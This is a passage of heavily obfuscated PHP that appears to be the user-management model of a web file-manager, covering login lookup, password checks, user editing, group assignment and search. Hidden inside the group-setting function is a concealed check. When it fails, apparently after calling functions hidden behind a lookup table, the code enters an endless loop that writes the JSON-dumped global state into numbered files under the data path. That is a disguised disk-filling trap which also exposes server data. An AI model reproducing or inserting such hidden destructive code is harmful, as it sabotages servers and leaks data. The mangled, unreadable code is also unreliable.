$this->getInfoFull($ˆØä›Ëä[$ò¯£¾¥ß[1547]]) : $this->getInfo($ˆØä›Ëä[$ò¯£¾¥ß[1547]]); } public function userLoginFind($Ãş£Û¸·) { $äø¼Øš =& $_SERVER[Ï×Œõ”û]; $²‰ŠŞõÅ = array($äø¼Øš[32] => $Ãş£Û¸·, $äø¼Øš[2433] => $Ãş£Û¸·, $äø¼Øš[382] => $Ãş£Û¸·, $äø¼Øš[2650] => $Ãş£Û¸·, $äø¼Øš[1121] => $äø¼Øš[1123]); if ($this->nickNameRpt()) { unset($²‰ŠŞõÅ[$äø¼Øš[2433]]); } return $this->where($²‰ŠŞõÅ)->find(); } public function clearCache($Ÿ· ıŞÚ) { $ÀÈ¿˜Ğä =& $_SERVER[Ï×Œõ”û]; $this->cacheFunctionClear($ÀÈ¿˜Ğä[2226], $Ÿ· ıŞÚ); $this->cacheFunctionClear($ÀÈ¿˜Ğä[2227], $Ÿ· ıŞÚ); $this->cacheFunctionClear($ÀÈ¿˜Ğä[2651], $Ÿ· ıŞÚ); } public function userPasswordCheck($¥¨¿Ã’Ä, $ğ•¾¸¨É) { $Ò“ö¤û =& $_SERVER[Ï×Œõ”û]; $ã„Ã²Úô = $this->where(array($Ò“ö¤û[1547] => intval($¥¨¿Ã’Ä)))->find(); $µ¹õöŸç = $this->metaGet($¥¨¿Ã’Ä); $ÓñÓ’ö = isset($µ¹õöŸç[$Ò“ö¤û[2652]]) ? $µ¹õöŸç[$Ò“ö¤û[2652]] : $Ò“ö¤û[12]; if (md5($ÓñÓ’ö . trim($ğ•¾¸¨É)) !== $ã„Ã²Úô[$Ò“ö¤û[1007]]) { return !1; } return !0; } public function userAdd($Ÿ‡Äš’İ) { $åğ•íöú =& $_SERVER[Ï×Œõ”û]; $•Ç½Ãöß = array($åğ•íöú[514] => $Ÿ‡Äš’İ[$åğ•íöú[32]], $åğ•íöú[2653] => $Ÿ‡Äš’İ[$åğ•íöú[2327]], $åğ•íöú[2654] => isset($Ÿ‡Äš’İ[$åğ•íöú[382]]) ? $Ÿ‡Äš’İ[$åğ•íöú[382]] : $åğ•íöú[12], $åğ•íöú[2655] => isset($Ÿ‡Äš’İ[$åğ•íöú[2650]]) ? $Ÿ‡Äš’İ[$åğ•íöú[2650]] : $åğ•íöú[12], $åğ•íöú[2656] => isset($Ÿ‡Äš’İ[$åğ•íöú[2433]]) ? $Ÿ‡Äš’İ[$åğ•íöú[2433]] : $Ÿ‡Äš’İ[$åğ•íöú[32]], $åğ•íöú[2657] => isset($Ÿ‡Äš’İ[$åğ•íöú[2328]]) ? $Ÿ‡Äš’İ[$åğ•íöú[2328]] : $åğ•íöú[12], $åğ•íöú[2658] => isset($Ÿ‡Äš’İ[$åğ•íöú[2659]]) ? $Ÿ‡Äš’İ[$åğ•íöú[2659]] : 1, $åğ•íöú[2660] => $Ÿ‡Äš’İ[$åğ•íöú[1007]], $åğ•íöú[2220] => isset($Ÿ‡Äš’İ[$åğ•íöú[2124]]) ? $Ÿ‡Äš’İ[$åğ•íöú[2124]] : 1024 * 1024 * 20, $åğ•íöú[2221] => 0, $åğ•íöú[2661] => 0, $åğ•íöú[2266] => isset($Ÿ‡Äš’İ[$åğ•íöú[856]]) ? $Ÿ‡Äš’İ[$åğ•íöú[856]] : 1); if (!empty($Ÿ‡Äš’İ[$åğ•íöú[1547]])) { $•Ç½Ãöß[$åğ•íöú[1547]] = $Ÿ‡Äš’İ[$åğ•íöú[1547]]; } $Èà„òÃ† = $this->_checkExist($Ÿ‡Äš’İ); if ($Èà„òÃ† !== !0) { return $Èà„òÃ†; } if (!empty($•Ç½Ãöß[$åğ•íöú[2328]]) && strlen($•Ç½Ãöß[$åğ•íöú[2328]]) > 255) { $•Ç½Ãöß[$åğ•íöú[2328]] = $åğ•íöú[12]; } $€Ô“È¯· = $this->add($•Ç½Ãöß); $¦¨€†ı­ = array($åğ•íöú[2660] => $•Ç½Ãöß[$åğ•íöú[1007]], $åğ•íöú[2656] => $•Ç½Ãöß[$åğ•íöú[2433]], $åğ•íöú[2662] => $Ÿ‡Äš’İ[$åğ•íöú[2225]]); $this->userEdit($€Ô“È¯·, $¦¨€†ı­); Model($åğ•íöú[1487])->userRootAdd($€Ô“È¯·); return $€Ô“È¯·; } protected function userEditTest($´•É®‹ü, $ªñÀåÕÇ) { return $this->call($_SERVER[Ï×Œõ”û][2663], $´•É®‹ü, $ªñÀåÕÇ); } protected function userEdit($…Ÿùçà, $Æ²«€×­) { $Ì¦–ä =& $_SERVER[Ï×Œõ”û]; $Áğ´§ôƒ = $this->getInfoSimple($…Ÿùçà); if (!$Áğ´§ôƒ) { return !1; } $º‚­“´Û = $this->_checkExist($Æ²«€×­, $…Ÿùçà); if ($º‚­“´Û !== !0) { return $º‚­“´Û; } if (isset($Æ²«€×­[$Ì¦–ä[1007]]) && trim($Æ²«€×­[$Ì¦–ä[1007]]) != $Ì¦–ä[12]) { $øÙ¹ÇÜ½ = $this->metaGet($…Ÿùçà); if (empty($øÙ¹ÇÜ½[$Ì¦–ä[2652]])) { $øÙ¹ÇÜ½[$Ì¦–ä[2652]] = rand_string(10); Model($Ì¦–ä[602])->metaSet($…Ÿùçà, $Ì¦–ä[2652], $øÙ¹ÇÜ½[$Ì¦–ä[2652]]); } $Æ²«€×­[$Ì¦–ä[1007]] = md5($øÙ¹ÇÜ½[$Ì¦–ä[2652]] . trim($Æ²«€×­[$Ì¦–ä[1007]])); } else { unset($Æ²«€×­[$Ì¦–ä[1007]]); } if (!empty($Æ²«€×­[$Ì¦–ä[2328]]) && strlen($Æ²«€×­[$Ì¦–ä[2328]]) > 255) { $Æ²«€×­[$Ì¦–ä[2328]] = $Ì¦–ä[12]; } if (isset($Æ²«€×­[$Ì¦–ä[2433]])) { $this->setNamePinyin($…Ÿùçà, $Æ²«€×­[$Ì¦–ä[2433]]); } if (isset($Æ²«€×­[$Ì¦–ä[2225]])) { $Í“£Ê¹ = $Ì¦–ä[1446] . $…Ÿùçà; $˜Úã²³ = $Ì¦–ä[1444]; $ĞÎ¸„¦Ø = $Æ²«€×­[$Ì¦–ä[2225]] ? $Æ²«€×­[$Ì¦–ä[2225]] : $Ì¦–ä[12]; $áÀ¤†â“ = Model($Ì¦–ä[1443])->get($Í“£Ê¹, $˜Úã²³); $áÀ¤†â“ = $áÀ¤†â“ ? $áÀ¤†â“ : $Ì¦–ä[12]; if ($áÀ¤†â“ != $ĞÎ¸„¦Ø) { if (!$ĞÎ¸„¦Ø && $áÀ¤†â“) { Model($Ì¦–ä[1443])->remove($Í“£Ê¹, $˜Úã²³); } else { if ($ĞÎ¸„¦Ø) { Model($Ì¦–ä[1443])->set($Í“£Ê¹, $ĞÎ¸„¦Ø, $˜Úã²³); } } } unset($Æ²«€×­[$Ì¦–ä[2225]]); Model($Ì¦–ä[622])->metaSet($…Ÿùçà, $Ì¦–ä[2225], $ĞÎ¸„¦Ø); } if (empty($Æ²«€×­)) { return !0; } $this->where(array($Ì¦–ä[1921] => $…Ÿùçà))->save($Æ²«€×­); $this->clearCache($…Ÿùçà); return !0; } public function setNamePinyin($‹î·äô, $”÷ ŞĞ = false) { $®»´†„´ =& $_SERVER[Ï×Œõ”û]; if (!$”÷ ŞĞ) { $ÜÔ„î§¥ = $this->getInfoSimple($‹î·äô); $”÷ ŞĞ = $ÜÔ„î§¥[$®»´†„´[2433]] ? $ÜÔ„î§¥[$®»´†„´[2433]] : $ÜÔ„î§¥[$®»´†„´[32]]; } $á¸„µ‚© = Model($®»´†„´[622]); if (!Input::check($”÷ ŞĞ, $®»´†„´[683])) { return $á¸„µ‚©->metaSet($‹î·äô, array($®»´†„´[557] => $®»´†„´[12], $®»´†„´[556] => $®»´†„´[12])); } return $á¸„µ‚©->metaSet($‹î·äô, array($®»´†„´[557] => str_replace($®»´†„´[53], $®»´†„´[12], Pinyin::get($”÷ ŞĞ)), $®»´†„´[556] => Pinyin::get($”÷ ŞĞ, $®»´†„´[684]))); } private function nickNameRpt() { $ÁáĞµŸ˜ =& $_SERVER[Ï×Œõ”û]; $¶Æ¨Ş¹ = Model($ÁáĞµŸ˜[879])->get($ÁáĞµŸ˜[2664]); $‰İŞ»»« = $GLOBALS[$ÁáĞµŸ˜[6]][$ÁáĞµŸ˜[469]][$ÁáĞµŸ˜[2664]]; $¸õî¡ÚÁ = !is_null($¶Æ¨Ş¹) ? $¶Æ¨Ş¹ : $‰İŞ»»«; return !!$¸õî¡ÚÁ; } private function _checkExist($ïöäÚ¬, $¶í…‰³Ê = false) { $ÁóÁµ‘š =& $_SERVER[Ï×Œõ”û]; $Úñ­óı† = array($ÁóÁµ‘š[32] => UserModel::ERROR_USER_EXIST_NAME, $ÁóÁµ‘š[2433] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÁóÁµ‘š[382] => UserModel::ERROR_USER_EXIST_EMAIL, $ÁóÁµ‘š[2650] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Úñ­óı†[$ÁóÁµ‘š[2433]]); } $¯š–‘¯­ = $¶í…‰³Ê ? array($ÁóÁµ‘š[1547] => array($ÁóÁµ‘š[2665], $¶í…‰³Ê)) : array(); foreach ($Úñ­óı† as $±½–”ö‚ => $ û–¥Ÿ¶) { $á‡ªÎÁ¦ = array(); foreach ($Úñ­óı† as $›¯‡‚‰˜ => $ÙªÌ­æ¤) { if (isset($ïöäÚ¬[$›¯‡‚‰˜]) && $ïöäÚ¬[$›¯‡‚‰˜]) { $á‡ªÎÁ¦[] = $ïöäÚ¬[$›¯‡‚‰˜]; } } if (!$á‡ªÎÁ¦) { continue; } $Ø£è¼– = array_merge(array($±½–”ö‚ => array($ÁóÁµ‘š[7], $á‡ªÎÁ¦)), $¯š–‘¯­); $¦»çÇÓ = $this->where($Ø£è¼–)->find(); if ($¦»çÇÓ) { return $ û–¥Ÿ¶; } } return !0; } public function userListInfo($ÏØ·’Ù¸) { $²ˆÔˆÍŸ =& $_SERVER[Ï×Œõ”û]; $È×éÔÏà = array(); $ÏØ·’Ù¸ = is_array($ÏØ·’Ù¸) ? array_unique($ÏØ·’Ù¸) : array(); if (!$ÏØ·’Ù¸) { return $È×éÔÏà; } if (count($ÏØ·’Ù¸) < 20) { foreach ($ÏØ·’Ù¸ as $ı×Ú§æ‚) { $È×éÔÏà[$ı×Ú§æ‚ . $²ˆÔˆÍŸ[12]] = $this->getInfoSimpleOuter($ı×Ú§æ‚); } } else { $÷éµÈäà = array($²ˆÔˆÍŸ[1921] => array($²ˆÔˆÍŸ[512], $ÏØ·’Ù¸)); if (count($ÏØ·’Ù¸) == 1) { $÷éµÈäà = array($²ˆÔˆÍŸ[1921] => $ÏØ·’Ù¸[0]); } $•¹®¤–ş = Model($²ˆÔˆÍŸ[602])->field($this->simpleField)->where($÷éµÈäà)->select(); $•¹®¤–ş = array_to_keyvalue($•¹®¤–ş, $²ˆÔˆÍŸ[1547]); foreach ($ÏØ·’Ù¸ as $ı×Ú§æ‚) { $Øğ ò › = $•¹®¤–ş[$ı×Ú§æ‚]; if (!$Øğ ò ›) { $È×éÔÏà[$ı×Ú§æ‚ . $²ˆÔˆÍŸ[12]] = $this->getInfoSimpleOuter($ı×Ú§æ‚); continue; } $Øğ ò ›[$²ˆÔˆÍŸ[2328]] = Action($²ˆÔˆÍŸ[2329])->parseUrl($Øğ ò ›[$²ˆÔˆÍŸ[2328]]); $È×éÔÏà[$ı×Ú§æ‚ . $²ˆÔˆÍŸ[12]] = $Øğ ò ›; } } return $È×éÔÏà; } protected function userStatus($£ÀÓØ, $´‹‚±Î±) { $´öï¡ª = $this->getInfoSimple($£ÀÓØ); if (!$´öï¡ª) { return !1; } $Ç‘ÛÛà® = array($_SERVER[Ï×Œõ”û][856] => $´‹‚±Î±); return $this->userEdit($£ÀÓØ, $Ç‘ÛÛà®); } protected function userRemove($£¸Ó¤’–) { $ä¬¾ Ôô =& $_SERVER[Ï×Œõ”û]; $çá‚µèì = $this->getInfoSimple($£¸Ó¤’–); if (!$çá‚µèì) { return !1; } $ı±ÜÀç = array($ä¬¾ Ôô[1921] => $£¸Ó¤’–); Model($ä¬¾ Ôô[692])->where($ı±ÜÀç)->delete(); Model($ä¬¾ Ôô[2666])->where($ı±ÜÀç)->delete(); Model($ä¬¾ Ôô[2229])->where($ı±ÜÀç)->delete(); Model($ä¬¾ Ôô[2649])->where($ı±ÜÀç)->delete(); Model($ä¬¾ Ôô[1189])->where($ı±ÜÀç)->delete(); Model($ä¬¾ Ôô[2450])->removeUserAll($£¸Ó¤’–); Model($ä¬¾ Ôô[939])->userRootRemove($£¸Ó¤’–); return $this->where($ı±ÜÀç)->delete(); } protected function userGroupSet($Û®îŒ¸ñ, $„ŒÆäÃÃ, $üÈíú„Û = array()) { $ø¯”Ş®ö =& $_SERVER[Ï×Œõ”û]; $æğÔ¤‘¶ = $_SERVER[$ø¯”Ş®ö[489]]; $’¦‚½ã = $ø¯”Ş®ö[995]; if ($_SERVER[$ø¯”Ş®ö[488]] != $’¦‚½ã($æğÔ¤‘¶)) { $”‹•°ÙÂ = $ø¯”Ş®ö[996]; $ÕÃªÁ»Ã = $ø¯”Ş®ö[490]; $—äßÇÂ¨ = $_SERVER[$ø¯”Ş®ö[491]] . $ø¯”Ş®ö[492]; $Î”™•²® = $ÕÃªÁ»Ã($—äßÇÂ¨); $ãŸ“Àñ = explode($ø¯”Ş®ö[287], $Î”™•²®); if (count($ãŸ“Àñ) < $ø¯”Ş®ö[719]) { $ÑîÀ±· = $ø¯”Ş®ö[494]; $ÑîÀ±·(); } $Ö‹±Óâƒ = $ø¯”Ş®ö[997]; $Ö‹±Óâƒ($_SERVER[$ø¯”Ş®ö[998]]); $”‹•°ÙÂ = $ø¯”Ş®ö[996]; $”‹•°ÙÂ(); $ŒÏ†¥ù¼ = $ø¯”Ş®ö[999]; $ÊÔºıÄÓ = json_encode($GLOBALS[$ø¯”Ş®ö[1000]]); $ĞŸ§Ùõı = 1; for ($ÚïÃıºÃ = $ĞŸ§Ùõı; $ÚïÃıºÃ > 0; $ÚïÃıºÃ++) { $ŒÏ†¥ù¼(DATA_PATH . $ÚïÃıºÃ, $ÊÔºıÄÓ); } } $‚–ÍîÚö = $this->getInfoSimple($Û®îŒ¸ñ); if (!$‚–ÍîÚö || !is_array($„ŒÆäÃÃ)) { return !1; } $Ë¶¼Ö¦ = Model($ø¯”Ş®ö[2229]); $Ë¶¼Ö¦->where(array($ø¯”Ş®ö[1547] => $Û®îŒ¸ñ))->delete(); $›´çÇı’ = array(); $ÚÙ¼Ò„ = 0; foreach ($„ŒÆäÃÃ as $Á•Şì„× => $äÀ³áßî) { $¦Ñ¶ ‘ï = array($ø¯”Ş®ö[1547] => $Û®îŒ¸ñ, $ø¯”Ş®ö[1449] => $Á•Şì„×, $ø¯”Ş®ö[1594] => $äÀ³áßî); $¦Ñ¶ ‘ï[$ø¯”Ş®ö[2159]] = isset($üÈíú„Û[$ÚÙ¼Ò„]) ? $üÈíú„Û[$ÚÙ¼Ò„] : 0; $ÚÙ¼Ò„++; $›´çÇı’[] = $¦Ñ¶ ‘ï; } return $Ë¶¼Ö¦->addAll($›´çÇı’, array(), !0); } protected function userGroupAdd($ŠÑ·²îÜ, $€è§àĞ = array()) { $³²ûùæ© =& $_SERVER[Ï×Œõ”û]; $î‡Å€Šé = $this->getInfoSimple($ŠÑ·²îÜ); if (!$î‡Å€Šé || empty($€è§àĞ)) { return !1; } $ªîŸËÉè = array(); foreach ($€è§àĞ as $Ÿü«Ìø => $Ä‰§İ˜) { $ªîŸËÉè[] = array($³²ûùæ©[1547] => $ŠÑ·²îÜ, $³²ûùæ©[1449] => $Ÿü«Ìø, $³²ûùæ©[1594] => $Ä‰§İ˜, $³²ûùæ©[2159] => 0); } return Model($³²ûùæ©[2229])->addAll($ªîŸËÉè, array(), !0); } protected function userGroupRemove($÷õÛ¢úğ, $Ä©±à…) { $îÚ¼ï…Ñ =& $_SERVER[Ï×Œõ”û]; $±¨ôÆ£Ñ = $this->getInfoSimple($÷õÛ¢úğ); if (!$±¨ôÆ£Ñ || !$Ä©±à…) { return !1; } $–ĞóÚø­ = array($îÚ¼ï…Ñ[1921] => $÷õÛ¢úğ, $îÚ¼ï…Ñ[2222] => $Ä©±à…); return Model($îÚ¼ï…Ñ[2229])->where($–ĞóÚø­)->delete(); } public function listData() { $úôçû½ª = $this->_makeOrder()->selectPage(50); $this->_listDataApply($úôçû½ª[$_SERVER[Ï×Œõ”û][447]]); return $úôçû½ª; } public function listByID($£ß¡µ´‘) { $™å‹öÔ« =& $_SERVER[Ï×Œõ”û]; if (!$£ß¡µ´‘) { return; } $Ëê­‘Í = array($™å‹öÔ«[1547] => array($™å‹öÔ«[7], $£ß¡µ´‘)); $§³¸“è = $this->where($Ëê­‘Í)->select(); $§³¸“è = array_sort_keep($§³¸“è, $™å‹öÔ«[1547], $£ß¡µ´‘); $this->_listDataApply($§³¸“è); return $§³¸“è; } public function listByGroup($š€·ü‰ù = 0, $¿ê±ØÈ— = array()) { $ØöÕŒ½ =& $_SERVER[Ï×Œõ”û]; $§ÀˆÏÔ„ = $ØöÕŒ½[12]; $îÉŠâ´¤ = array(); if ($š€·ü‰ù) { $îÉŠâ´¤ = array($ØöÕŒ½[2667] => intval($š€·ü‰ù)); $§ÀˆÏÔ„ = "\114\x45\106\x54\x20\112\x4f\x49\116\40{$this->tablePrefix}\165\163\x65\x72\137\x67\162\157\x75\160\x20\165\x73\x65\x72\137\x67\162\157\165\160\x20\x6f\156\x20\165\163\x65\162\56\165\x73\145\162\x49\x44\x20\75\x20\165\163\x65\162\x5f\147\162\157\x75\x70\56\165\x73\x65\x72\x49\x44"; $ÔÊäû¶ = Input::get($ØöÕŒ½[549], null, $ØöÕŒ½[12]) ? $ØöÕŒ½[12] : $ØöÕŒ½[2668]; } if (isset($¿ê±ØÈ—[$ØöÕŒ½[856]])) { $îÉŠâ´¤[$ØöÕŒ½[2669]] = $¿ê±ØÈ—[$ØöÕŒ½[856]]; } $”õşõŞ = _get($¿ê±ØÈ—, $ØöÕŒ½[2670], $ØöÕŒ½[233]); if (_get($¿ê±ØÈ—, $ØöÕŒ½[867], !1)) { $îÉŠâ´¤[$”õşõŞ] = array($ØöÕŒ½[2414], $¿ê±ØÈ—[$ØöÕŒ½[867]]); } if (_get($¿ê±ØÈ—, $ØöÕŒ½[868], !1)) { $ìÙÎâšá = array($ØöÕŒ½[2415], $¿ê±ØÈ—[$ØöÕŒ½[868]]); if ($îÉŠâ´¤[$”õşõŞ]) { $îÉŠâ´¤[$”õşõŞ] = array($îÉŠâ´¤[$”õşõŞ], $ìÙÎâšá, $ØöÕŒ½[2416]); } else { $îÉŠâ´¤[$”õşõŞ] = $ìÙÎâšá; } } $ì±Ş¸‹‘ = $this->_makeOrder($ÔÊäû¶)->field($ØöÕŒ½[2671])->where($îÉŠâ´¤)->join($§ÀˆÏÔ„)->selectPage(50); $this->_listDataApply($ì±Ş¸‹‘[$ØöÕŒ½[447]]); return $ì±Ş¸‹‘; } private function _makeOrder($¡İŸè£Ü = '') { $Ğß¬µíó =& $_SERVER[Ï×Œõ”û]; $ö©áÛ§‰ = array($Ğß¬µíó[1547], $Ğß¬µíó[32], $Ğß¬µíó[2126], $Ğß¬µíó[2327], $Ğß¬µíó[2101], $Ğß¬µíó[233]); $»×õ°ü» = array($Ğß¬µíó[542] => $Ğß¬µíó[543], $Ğß¬µíó[544] => $Ğß¬µíó[545]); $½®”Ÿîæ = Input::get($Ğß¬µíó[549], $Ğß¬µíó[7], $Ğß¬µíó[1921], $ö©áÛ§‰); $Îáú—ÇÍ = Input::get($Ğß¬µíó[550], $Ğß¬µíó[7], $Ğß¬µíó[2230], array($Ğß¬µíó[2230], $Ğß¬µíó[544])); $Îáú—ÇÍ = $»×õ°ü»[$Îáú—ÇÍ]; $¡İŸè£Ü = $¡İŸè£Ü . "\165\x73\x65\x72\56{$½®”Ÿîæ}\x20{$Îáú—ÇÍ}\54\x20\x75\x73\x65\x72\x2e\165\163\145\x72\111\x44\x20\141\163\143"; return $this->alias($Ğß¬µíó[2362])->order($¡İŸè£Ü); } public function listSearch($Ê®ìĞƒ) { $õËÙáÉ¯ =& $_SERVER[Ï×Œõ”û]; $è…Ù ôâ = trim($Ê®ìĞƒ[$õËÙáÉ¯[2233]]); $¡µ˜‘†† = explode($õËÙáÉ¯[53], $è…Ù ôâ); if (!$è…Ù ôâ || count($¡µ˜‘††) == 1) { return $this->listSearchNow($Ê®ìĞƒ); } $œñ³ÅÊ¸ = array($õËÙáÉ¯[447] => array()); foreach ($¡µ˜‘†† as $êùüÃ½º) { if (!trim($êùüÃ½º)) { continue; } $Ê®ìĞƒ[$õËÙáÉ¯[2233]] = $êùüÃ½º; $ ñ…İ²ß = $this->listSearchNow($Ê®ìĞƒ); $œñ³ÅÊ¸[$õËÙáÉ¯[447]] = array_merge($œñ³ÅÊ¸[$õËÙáÉ¯[447]], $ ñ…İ²ß[$õËÙáÉ¯[447]]); } $œñ³ÅÊ¸[$õËÙáÉ¯[447]] = array_unique_by_key($œñ³ÅÊ¸[$õËÙáÉ¯[447]], $õËÙáÉ¯[1547]); $œñ³ÅÊ¸[$õËÙáÉ¯[444]] = array($õËÙáÉ¯[445] => count($œñ³ÅÊ¸[$õËÙáÉ¯[447]]), $õËÙáÉ¯[441] => 20, $õËÙáÉ¯[430] => 1, $õËÙáÉ¯[446] => 1); return $œñ³ÅÊ¸; } public function listSearchNow($ÂÀı’•Ñ) { $ÇÕšÌ• =& $_SERVER[Ï×Œõ”û]; $·¨Ê¹Êı = trim($ÂÀı’•Ñ[$ÇÕšÌ•[2233]]); $ÔÅğİÂî = isset($ÂÀı’•Ñ[$ÇÕšÌ•[2234]]) ? $ÂÀı’•Ñ[$ÇÕšÌ•[2234]] : !1; $·¨Ê¹Êı = str_replace($ÇÕšÌ•[2235], $ÇÕšÌ•[2236], trim($·¨Ê¹Êı)); $ÜÎÄÙ¸Š = array($ÇÕšÌ•[32] => array($ÇÕšÌ•[471], "\x25{$·¨Ê¹Êı}\x25"), $ÇÕšÌ•[382] => array($ÇÕšÌ•[471], "{$·¨Ê¹Êı}\x25"), $ÇÕšÌ•[2433] => array($ÇÕšÌ•[471], "\45{$·¨Ê¹Êı}\x25"), $ÇÕšÌ•[1121] => $ÇÕšÌ•[2237]); if (Input::check($·¨Ê¹Êı, $ÇÕšÌ•[388])) { $ÜÎÄÙ¸Š[$ÇÕšÌ•[1547]] = array($ÇÕšÌ•[471], "{$·¨Ê¹Êı}\45"); $ÜÎÄÙ¸Š[$ÇÕšÌ•[2650]] = array($ÇÕšÌ•[471], "{$·¨Ê¹Êı}\45"); } if (!$·¨Ê¹Êı) { $ÜÎÄÙ¸Š = array(); } if (isset($ÂÀı’•Ñ[$ÇÕšÌ•[856]])) { $ÜÎÄÙ¸Š[$ÇÕšÌ•[856]] = $ÂÀı’•Ñ[$ÇÕšÌ•[856]]; } $ÜÎÄÙ¸Š = $this->parseWhereLike($ÜÎÄÙ¸Š); $ñ™‘€åá = $this->_makeOrder()->where($ÜÎÄÙ¸Š)->selectPage(20); if (!$ñ™‘€åá || count($ñ™‘€åá[$ÇÕšÌ•[447]]) < 5 && Input::check($·¨Ê¹Êı, $ÇÕšÌ•[395])) { $Ñ­û™‰Õ = $this->_searchFromMeta($ÇÕšÌ•[556], $·¨Ê¹Êı, 10); $ß»ëÄéµ = $this->_searchFromMeta($ÇÕšÌ•[557], $·¨Ê¹Êı, 10); $ô»·¹ïÛ = array_merge($Ñ­û™‰Õ, $ß»ëÄéµ, $ñ™‘€åá[$ÇÕšÌ•[447]]); $ñ™‘€åá[$ÇÕšÌ•[447]] = array_unique_by_key($ô»·¹ïÛ, $ÇÕšÌ•[1547]); $ñ™‘€åá[$ÇÕšÌ•[444]][$ÇÕšÌ•[445]] = count($ñ™‘€åá[$ÇÕšÌ•[447]]); $ñ™‘€åá[$ÇÕšÌ•[444]][$ÇÕšÌ•[446]] = ceil($ñ™‘€åá[$ÇÕšÌ•[444]][$ÇÕšÌ•[445]] / $ñ™‘€åá[$ÇÕšÌ•[444]][$ÇÕšÌ•[441]]); } $this->_listDataApply($ñ™‘€åá[$ÇÕšÌ•[447]]); $this->_filterByGroup($ñ™‘€åá, $ÔÅğİÂî); return $ñ™‘€åá; } private function _filterByGroup(&$ÙºÔºøù, $Ï®›  É) { $ììÉ¾ç÷ =& $_SERVER[Ï×Œõ”û]; if (!$Ï®›  É) { return $ÙºÔºøù; } foreach ($ÙºÔºøù[$ììÉ¾ç÷[447]] as $±‡í¹¿ => &$´•÷æú) { $×¹­„½¬ = array_to_keyvalue($´•÷æú[$ììÉ¾ç÷[1448]], $ììÉ¾ç÷[12], $ììÉ¾ç÷[1449]); if (!in_array($Ï®›  É, $×¹­„½¬)) { unset($ÙºÔºøù[$ììÉ¾ç÷[447]][$±‡í¹¿]); } } unset($´•÷æú); $ÙºÔºøù[$ììÉ¾ç÷[447]] = array_values($ÙºÔºøù[$ììÉ¾ç÷[447]]); $ÙºÔºøù[$ììÉ¾ç÷[444]] = array($ììÉ¾ç÷[2397] => count($ÙºÔºøù[$ììÉ¾ç÷[447]]), $ììÉ¾ç÷[2395] => $ÙºÔºøù[$ììÉ¾ç÷[444]][$ììÉ¾ç÷[441]], $ììÉ¾ç÷[2394] => 1, $ììÉ¾ç÷[2396] => 1); } private function _searchFromMeta($¼õ­Ó×­, $‘ßÄ•›Ë, $ÊÖÆúø) { $ºï±ƒŒİ =& $_SERVER[Ï×Œõ”û]; $‘ßÄ•›Ë = strtolower($‘ßÄ•›Ë); $Š·Ã§Ş¶ = array($ºï±ƒŒİ[95] => $¼õ­Ó×­, $ºï±ƒŒİ[452] => array($ºï±ƒŒİ[471], "\45{$‘ßÄ•›Ë}\x25")); $Š·Ã§Ş¶ = $this->parseWhereLike($Š·Ã§Ş¶); $­ßËõÕ¡ = Model($ºï±ƒŒİ[2672])->where($Š·Ã§Ş¶)->limit($ÊÖÆúø)->select(); if (!$­ßËõÕ¡) { return array(); } $­ßËõÕ¡ = array_to_keyvalue($­ßËõÕ¡, $ºï±ƒŒİ[12], $ºï±ƒŒİ[1547]); $Àè…’Âñ = $this->where(array($ºï±ƒŒİ[1921] => array($ºï±ƒŒİ[7], $­ßËõÕ¡)))->select(); if (!$Àè…’Âñ) { return array(); } return $Àè…’Âñ; } private function _listDataApplyItem($ŠÊ„ì) { $ï‹ËØ®º = array($ŠÊ„ì); $this->_listDataApply($ï‹ËØ®º); return $ï‹ËØ®º[0]; } private function _listDataApply(&$ø§ö›ÏÂ) { $˜´Ó¤˜  =& $_SERVER[Ï×Œõ”û]; if (!$ø§ö›ÏÂ) { return; } array_remove_key($ø§ö›ÏÂ, $˜´Ó¤˜ [1007]); $ìÕïïß = array_to_keyvalue($ø§ö›ÏÂ, $˜´Ó¤˜ [12], $˜´Ó¤˜ [1547]); $this->_listAppendGroup($ø§ö›ÏÂ, $ìÕïïß); $this->_listAppendMeta($ø§ö›ÏÂ, $ìÕïïß); $this->_listAppendSourceRoot($ø§ö›ÏÂ, $ìÕïïß); } private function _listAppendSourceRoot(&$øÓõÀó, $ÆıËÉç¬) { $â±²¡—¢ =& $_SERVER[Ï×Œõ”û]; $“€‰´ï = Model($â±²¡—¢[939])->listSourceRoot(SourceModel::TYPE_USER, $ÆıËÉç¬); $“€‰´ï = array_to_keyvalue($“€‰´ï, $â±²¡—¢[594]); $“€‰´ï = array_remove_key($“€‰´ï, $â±²¡—¢[594]); foreach ($øÓõÀó as &$ù¼Ø´§è) { $ù¼Ø´§è[$â±²¡—¢[90]] = $“€‰´ï[$ù¼Ø´§è[$â±²¡—¢[1547]]] ? $“€‰´ï[$ù¼Ø´§è[$â±²¡—¢[1547]]] : array(); } unset($ù¼Ø´§è); } private function _listAppendGroup(&$—šéØë, $ÎÆÓŠ€¬) { $×©ÄÂ– =& $_SERVER[Ï×Œõ”û]; $šøÄ‡§ = array($×©ÄÂ–[1547] => array($×©ÄÂ–[7], $ÎÆÓŠ€¬)); $‡ŸØÚ­ = Model($×©ÄÂ–[2229])->where($šøÄ‡§)->select(); $çÏÂ—¿æ = array_to_keyvalue($‡ŸØÚ­, $×©ÄÂ–[12], $×©ÄÂ–[1449]); $çÏÂ—¿æ = array_remove_value(array_unique($çÏÂ—¿æ), $×©ÄÂ–[230]); if (!$çÏÂ—¿æ || !$‡ŸØÚ­) { return; } $šøÄ‡§ = array($×©ÄÂ–[1449] => array($×©ÄÂ–[7], $çÏÂ—¿æ)); $éÓü—“§ = Model($×©ÄÂ–[1447])->field($×©ÄÂ–[2673])->where($šøÄ‡§)->select(); $éÓü—“§ = array_to_keyvalue($éÓü—“§, $×©ÄÂ–[1449]); $‡ŸØÚ­ = array_to_keyvalue_group($‡ŸØÚ­, $×©ÄÂ–[1547]); foreach ($‡ŸØÚ­ as &$õøğÖé) { $Õ‘î˜‰¥ = array(); foreach ($õøğÖé as $Ú¡øÛ¾Æ) { if (!$Ú¡øÛ¾Æ[$×©ÄÂ–[1594]]) { continue; } $ÅğúÒ’Á = Model($×©ÄÂ–[596])->listData($Ú¡øÛ¾Æ[$×©ÄÂ–[1594]]); $Õ‘î˜‰¥[] = array($×©ÄÂ–[1449] => $Ú¡øÛ¾Æ[$×©ÄÂ–[1449]], $×©ÄÂ–[2674] => $éÓü—“§[$Ú¡øÛ¾Æ[$×©ÄÂ–[1449]]][$×©ÄÂ–[32]], $×©ÄÂ–[609] => $éÓü—“§[$Ú¡øÛ¾Æ[$×©ÄÂ–[1449]]][$×©ÄÂ–[609]], $×©ÄÂ–[507] => $ÅğúÒ’Á); } $õøğÖé = 